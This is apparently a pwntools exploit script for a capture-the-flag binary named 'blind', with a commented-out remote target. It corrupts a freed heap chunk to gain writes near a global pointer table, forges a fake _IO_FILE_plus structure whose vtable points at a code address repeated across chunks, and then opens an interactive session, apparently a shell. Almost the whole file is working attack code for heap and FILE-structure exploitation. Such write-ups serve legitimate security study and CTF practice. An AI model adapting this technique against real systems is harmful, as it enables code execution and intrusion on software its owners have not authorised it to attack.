from pwn import *
import struct

_IO_USE_OLD_IO_FILE = False
_BITS = 64

def _u64(data):
    return struct.unpack("<Q",data)[0]

def _u32(data):
    return struct.unpack("<I",data)[0]

def _u16(data):
    return struct.unpack("<H",data)[0]

def _u8(data):
    return ord(data)

def _usz(data):
    if _BITS == 32:
        return _u32(data)
    elif _BITS == 64:
        return _u64(data)
    else:
        print("[-] Invalid _BITS")
        exit()

def _ua(data):
    if _BITS == 32:
        return _u32(data)
    elif _BITS == 64:
        return _u64(data)
    else:
        print("[-] Invalid _BITS")
        exit()

def _p64(data):
    return struct.pack("<Q",data)

def _p32(data):
    return struct.pack("<I",data)

def _p16(data):
    return struct.pack("<H",data)

def _p8(data):
    return chr(data)

def _psz(data):
    if _BITS == 32:
        return _p32(data)
    elif _BITS == 64:
        return _p64(data)
    else:
        print("[-] Invalid _BITS")
        exit()

def _pa(data):
    if _BITS == 32:
        return struct.pack("<I", data)
    elif _BITS == 64:
        return struct.pack("<Q", data)
    else:
        print("[-] Invalid _BITS")
        exit()

class _IO_FILE_plus:
    def __init__(self):
        self._flags = 0x00000000fbad2887         # High-order word is _IO_MAGIC; rest is flags.
        self._IO_read_ptr = 0x602500   # Current read pointer
        self._IO_read_end = 0x602500   # End of get area
        self._IO_read_base = 0x602500  # Start of putback+get area
        self._IO_write_base = 0x602600 # Start of put area
        self._IO_write_ptr = 0x602600  # Current put pointer
        self._IO_write_end = 0x602600  # End of put area
        self._IO_buf_base = 0x602600   # Start of reserve area
        self._IO_buf_end = 0x602601    # End of reserve area

        # The following fields are used to support backing up and undo.
        self._IO_save_base = 0      # Pointer to start of non-current get area
        self._IO_backup_base = 0    # Pointer to first valid character of backup area
        self._IO_save_end = 0       # Pointer to end of non-current get area

        self._markers = 0
        self._chain = 0

        self._fileno = 0
        self._flags2 = 0
        self._old_offset = 0    # This used to be _offset but it's too small

        # 1+column number of pbase(); 0 is unknown
        self._cur_column = 0
        self._vtable_offset = 0
        self._shortbuf = 0

        self._lock = 0x602700

        if not _IO_USE_OLD_IO_FILE:
            self._offset = 0
            self._codecvt = 0
            self._wide_data = 0
            self._freeres_list = 0
            self._freeres_buf = 0
            self.__pad5 = 0
            self._mode = 0
            self._unused2 = [0 for i in range(15 * 4 - 5 * _BITS / 8)]
        self.vtable = 0x602168

    def tostr(self):
        buf = _p64(self._flags & 0xffffffff) + \
            _pa(self._IO_read_ptr) + \
            _pa(self._IO_read_end) + \
            _pa(self._IO_read_base) + \
            _pa(self._IO_write_base) + \
            _pa(self._IO_write_ptr) + \
            _pa(self._IO_write_end) + \
            _pa(self._IO_buf_base) + \
            _pa(self._IO_buf_end) + \
            _pa(self._IO_save_base) + \
            _pa(self._IO_backup_base) + \
            _pa(self._IO_save_end) + \
            _pa(self._markers) + \
            _pa(self._chain) + \
            _p32(self._fileno) + \
            _p32(self._flags2) + \
            _p64(self._old_offset) + \
            _p16(self._cur_column) + \
            _p8(self._vtable_offset) + \
            _p8(self._shortbuf)
        if _BITS == 64:
            buf += _p32(0)
        buf += _pa(self._lock)
        if not _IO_USE_OLD_IO_FILE:
            buf += \
            _p64(self._offset) + \
            _pa(self._codecvt) + \
            _pa(self._wide_data) + \
            _pa(self._freeres_list) + \
            _pa(self._freeres_buf) + \
            _psz(self.__pad5) + \
            _p32(self._mode) + \
            ''.join(map(lambda x:_p8(x), self._unused2)) +\
            _pa(self.vtable)
        return buf

    def __str__(self):
        return self.tostr()

p = process("./blind")
#p = remote("106.75.20.44 ",9999)

def new(index,content):
    p.recvuntil("Choice:")
    p.sendline('1')
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil("Content:")
    p.sendline(content)

def release(index):
    p.recvuntil("Choice:")
    p.sendline('3')
    p.recvuntil("Index:")
    p.sendline(str(index))

def change(index,content):
    p.recvuntil("Choice:")
    p.sendline('2')
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil("Content:")
    p.send(content)

new(0,'111')
new(1,'222')
release(0)
change(0,p64(0x60203d)+'\n')
new(2,"333")
new(3,"4"*19 + p64(0x602088)+p64(0x6020f0)+p64(0x602158)+p64(0x6021c0)+p64(0x602020))
s = _IO_FILE_plus().tostr()
print hex(len(s))
change(0,s[0:0x68])
change(1,s[0x68:0xd0])
change(2,s[0xd0:] + p64(1)*2 + p64(0x4008E3)*9)
change(3,p64(0x4008E2)*13)
p.recvuntil("Choice:")
p.sendline("2")
p.recvuntil("Index:")
p.sendline('4')
p.recvuntil("Content:")
p.sendline(p64(0x602088))
p.sendline("your token")
p.interactive()
